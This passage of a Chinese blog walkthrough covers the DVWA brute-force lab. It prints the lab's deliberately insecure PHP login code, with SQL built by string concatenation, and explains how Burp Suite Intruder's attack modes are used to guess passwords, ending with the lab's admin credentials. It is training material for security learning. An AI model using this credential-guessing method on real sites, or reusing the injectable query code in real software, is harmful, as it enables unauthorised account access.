double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysql_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_result</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"avatar\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token function\">mysql_close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>随便输入用户名和密码，然后用 BurpSuite 抓包，点击登录，抓到包以后发送到 Intruder 模块，攻击类型选择 Cluster Bomb，将用户名和密码设置为变量。（这里用 Sniper 就行，选取密码这一个变量进行爆破，因为已经知道用户名 admin）</p>\n<p><img loading=\"lazy\" data-src=\"image-20240515151306315-1721199923435-4.png\" alt=\"image-20240515151306315\" /></p>\n<blockquote>\n<p>[!IMPORTANT]</p>\n<p>攻击类型：</p>\n<ul>\n<li>\n<p>Sniper (狙击手)：可以设置任意多的变量，但只能设置一个 payload。所有变量都是使用一个 payload，当对一个变量进行爆破时，其他变量值保持不变，然后根据变量的顺序依次爆破。</p>\n<p>对于用户名和密码的爆破，常用于已经知道了用户名或密码中的一个，去爆破另一个。</p>\n</li>\n<li>\n<p>Batter ram (攻城锤)：可以设置任意多的变量，但只能设置一个 payload。所有变量都是使用一个 payload，同时爆破变量。</p>\n<p>与 Sniper 类似，唯一的区别是，不是根据变量的顺序进行依次爆破，而是同时爆破所有变量。</p>\n<p>对于用户名和密码的爆破不适用，使用这种攻击类型，每次爆破用户名和密码都是一样的。</p>\n</li>\n<li>\n<p>Pitchfork (干草叉)：可以设置任意多的变量，每个变量都可以设置不同的 payload。爆破时，所有变量同时进行爆破，也就是说，变量每次读取的是对应 payload 中同一行的字段。例如，在爆破用户名和密码时，设置了两个 payload，第一行的用户名只能匹配第一行的密码，第二行的用户名只能匹配第二行的密码，以此类推... 这种攻击类型对于爆破用户名和密码是不完全的，仅仅只是把同一行的用户名和密码进行匹配，没有交错匹配。</p>\n</li>\n<li>\n<p>Cluster Bomb (集束炸弹)：可以设置任意多的变量，每个变量都可以设置不同的 payload。爆破时，会尝试所有组合。（笛卡尔积）</p>\n<p>以爆破用户名和密码为例，用户名变量为 payload1，密码变量为 payload2，用户名变量会读取 payload1 中的第一行时，密码变量读取 payload2 中的第一行；用户名变量会读取 payload1 中的第二行时，密码变量仍读取 payload2 中的第一行... 依次类推，直到 payload1 中的字段被读取完毕，密码才开始读取 payload2 中的第二行... 依次类推，直到所有用户名和密码的组合都尝试过一边。这可以说是 Pitchfork 的升级版，用户名和密码会交错匹配，尝试所有组合，但耗时间。</p>\n</li>\n</ul>\n</blockquote>\n<p>然后进行 payload 设置，分别对 payload1 和 payload2 设置字典，点击 start attack 开始爆破</p>\n<p><img loading=\"lazy\" data-src=\"image-20240515160713818-1721199923435-5.png\" alt=\"image-20240515160713818\" /></p>\n<p>看返回的长度可以确认真实的用户名和密码</p>\n<p><img loading=\"lazy\" data-src=\"image-20240515165105834-1721199923435-3.png\" alt=\"image-20240515165105834\" /></p>\n<p>或者选择筛选，我们从源码中可以看见登录成功时返回字段 <code>Username and/or password incorrect.</code></p>\n<p><img loading=\"lazy\" data-src=\"image-20240516140040131-1721199923435-6.png\" alt=\"image-20240516140040131\" /></p>\n<p><img loading=\"lazy\" data-src=\"image-20240516140057072-1721199923435-7.png\" alt=\"image-20240516140057072\" /></p>\n<p>用户名：admin 密码：password （用户名不区分大小写）到此 low 级结束。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240515172535555-1721199923435-10.png\" alt=\"image-20240515172535555\" /></p>\n<h3 id=\"medium级\"><a class=\"anchor\" href=\"#medium级\">#</a> medium 级</h3>\n<p>先进行代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Sanitise username input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// Sanitise password input</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// Check the database</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$row</span>    <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"avatar\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>相比 low，medium 增加了 <code>mysqli_real_escape_string()</code>  函数，这个函数用于转义字符串中的特殊字符，以防止与 MySQL 数据库交互时发生 SQL 注入攻击。这个函数接收两个参数，第一个参数是数据库的连接对象，第二个参数是需要转义的字符串。还在登录失败后增加了 sleep (2) 睡眠 2 秒，增加了暴力破解的时间。因此，对暴力破解还是没有实质性的防治措施，用 low 级的方法就能可以了，就不再演示。</p>\n<h3 id=\"high级\"><a class=\"anchor\" href=\"#high级\">#</a> high 级</h3>\n<p>先进行代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Check Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Sanitise username input</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// Sanitise password input</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">// Check database</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token 